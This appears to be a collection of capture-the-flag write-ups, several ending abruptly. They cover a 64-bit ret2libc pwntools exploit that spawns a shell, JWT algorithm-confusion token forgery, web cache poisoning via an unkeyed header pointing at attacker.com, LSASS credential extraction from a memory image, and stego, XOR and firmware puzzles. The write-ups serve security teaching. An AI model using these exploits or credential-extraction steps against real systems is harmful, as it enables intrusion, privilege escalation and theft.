item.title: Binary Exploitation: ret2libc on 64-bit
item.description:
Challenge Overview

A 64-bit ELF with NX enabled, no stack canary, partial RELRO. The binary reads up to 256 bytes into a 64-byte buffer.

Solution

Step 1: Find the offset

from pwn import *
p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(f"Offset: {offset}")  # 72

Step 2: Leak libc base via puts

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP(elf)

pop_rdi   = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * 72,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']   # return to main for second stage
)
p.sendline(payload)
p.recvline()
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
print(f"libc @ {hex(libc.address)}")

Step 3: Call system("/bin/sh")

payload2 = flat(
    b'A' * 72,
    ret_gadget,            # stack alignment
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system']
)
p.sendline(payload2)
p.interactive()

$ cat flag.txt
FLAG{r3t2l1bc_64b1t_st4ck_sm4sh3d}

Flag

FLAG{r3t2l1bc_64b1t_st4ck_sm4sh3d}

item.title: Broken JWT: Algorithm Confusion Attack
item.description:
Challenge Overview

Login as guest, get a JWT, become admin. The server accepted RS256 tokens — and conveniently exposed its public key at /api/pubkey.

Solution

Step 1: Fetch the public key

$ curl https://cryo.isfcr.ctf/api/pubkey
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----

Step 2: Login and decode the JWT

$ curl -X POST /api/login -d '{"user":"guest","pass":"guest"}'
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."}

Decoded payload: {"user": "guest", "role": "viewer", "iat": 1729123456}

Step 3: Forge HS256 token using the public key as secret

import jwt, base64

pub_key = open('pubkey.pem').read()

payload = {"user": "admin", "role": "admin", "iat": 1729123456}

# Sign with HS256 using the PEM-encoded public key as the HMAC secret
forged = jwt.encode(payload, pub_key, algorithm='HS256')
print(forged)

Step 4: Access admin endpoint

$ curl -H "Authorization: Bearer <forged_token>" /api/admin/flag
{"flag": "FLAG{4lg0_c0nfus10n_jwt_pwn3d}"}

Flag

FLAG{4lg0_c0nfus10n_jwt_pwn3d}

item.title: Hidden in Plain Sight: Steghide LSB
item.description:
Challenge Overview

Two files: signal.png (a grid of noise-like pixels) and key.wav (static audio). Clearly related — the question is how.

Solution

Step 1: Examine the PNG

$ file signal.png
signal.png: PNG image data, 800 x 600, 8-bit/color RGB
$ exiftool signal.png | grep -i comment
Comment: Frequency holds the key

The comment pointed straight at the audio file.

Step 2: Analyse the WAV in Audacity

Opened key.wav → Analyse → Plot Spectrum. Switching to spectrogram view revealed text drawn in frequency bands:

item.title: Memory Dump: Credential Extraction
item.description:
Challenge Overview

We’re handed a raw Windows 10 memory image (memdump.raw). Goal: extract the user credentials before the forensic window closes.

Solution

Step 1: Identify OS profile

$ vol3 -f memdump.raw windows.info
Kernel Base: 0xf80002a52000
DTB: 0x1aa000
...
NtBuildLab: 7601.win7sp1_rtm.101119-1850

Step 2: List processes — find LSASS

$ vol3 -f memdump.raw windows.pslist | grep -i lsass
PID 504   lsass.exe   2024-08-20 09:14:32

Step 3: Dump LSASS memory and extract secrets

$ vol3 -f memdump.raw windows.lsadump

Output included NTLM hashes and, because WDigest was enabled, cleartext passwords:

item.title: Web Cache Poisoning via Unkeyed Header
item.description:
Challenge Overview

The target was a news site with aggressive caching. Our goal: make every visitor receive our injected content.

Solution

Step 1: Probe cache behaviour

GET / HTTP/1.1
Host: target.xploitx.ctf
X-Forwarded-Host: attacker.com

Response:

Age: 0
X-Cache: MISS
Content-Type: text/html
...
<link href="https://attacker.com/styles.css" rel="stylesheet">

The X-Forwarded-Host header was reflected into asset URLs but not included in the cache key.

Step 2: Host the payload

On attacker.com/styles.css:

body::before {
  content: "PWNED by C01DC0FF33";
  position: fixed; top: 0; left: 0; z-index: 9999;
  background: red; color: white; padding: 1rem;
}

Step 3: Poison the cache

for i in $(seq 20); do
  curl -s -H "X-Forwarded-Host: attacker.com" https://target.xploitx.ctf/ -o /dev/null
done

After the cache stored our poisoned response (Age reset to 0 then climbed), all users received the injected stylesheet.

item.title: Flag in the Noise: XOR Layered Cipher
item.description:
Challenge Overview

Flag in the Noise gave us a ciphertext that appeared random. The hint said “layers protect secrets” — suggesting multiple passes of encryption.

Solution

Step 1: Identify the encryption scheme

with open('cipher.bin', 'rb') as f:
    data = f.read()

# Check byte frequency distribution
from collections import Counter
freq = Counter(data)
print(sorted(freq.items(), key=lambda x: -x[1])[:10])

Output showed a non-uniform distribution — not true random, but multi-XOR.

Step 2: Recover the key length

Using the Index of Coincidence method:

def ic(data):
    n = len(data)
    counts = Counter(data)
    return sum(c*(c-1) for c in counts.values()) / (n*(n-1))

for keylen in range(1, 40):
    chunks = [data[i::keylen] for i in range(keylen)]
    avg_ic = sum(ic(c) for c in chunks) / keylen
    print(f"keylen={keylen}  IC={avg_ic:.4f}")

Key length 12 gave IC ≈ 0.065 (close to English text IC).

item.title: ECHO-9: Firmware Secrets
item.description:
Challenge Overview

ECHO-9 presented us with a binary firmware image from an embedded device. The goal was to find the hidden flag buried within.

Solution

Step 1: Initial Reconnaissance

$ file echo9.bin
echo9.bin: data

$ binwalk echo9.bin
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes
64            0x40            LZMA compressed data

Step 2: Extracting the Filesystem

$ binwalk -e echo9.bin
$ cd _echo9.bin.extracted/
$ ls
40.7z  40  squashfs-root/

Step 3: Entropy Analysis

High-entropy regions in the image suggested encrypted or compressed data. Using binwalk -E echo9.bin revealed a section with notably lower entropy — a plaintext region.
